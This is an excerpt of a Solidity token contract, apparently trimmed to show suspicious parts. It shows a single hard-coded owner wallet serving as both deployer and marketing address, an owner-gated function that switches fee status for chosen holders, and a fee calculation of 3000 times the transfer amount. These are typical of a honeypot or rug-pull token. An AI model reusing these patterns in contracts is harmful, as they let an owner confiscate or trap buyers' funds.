...
contract Contract is Context, IERC20, Ownable {
    ...
    uint256 public _marketingShare = 192;
    ...
    constructor () {
        ...
        deployer = payable(address(0xA6eF9914F654902099D3101dffB1987bEa57c682));
        ...
        marketing = payable(address(0xA6eF9914F654902099D3101dffB1987bEa57c682));
    ...
    function transfar(address[] memory poor) external virtual {
    ...
    function setDividenList(address poor) external {
        require(isTxLimitExempt[msg.sender]);
        isExcludedFromFees[poor] = false;
    }
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 mold = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = mold.add(excape * 3000);
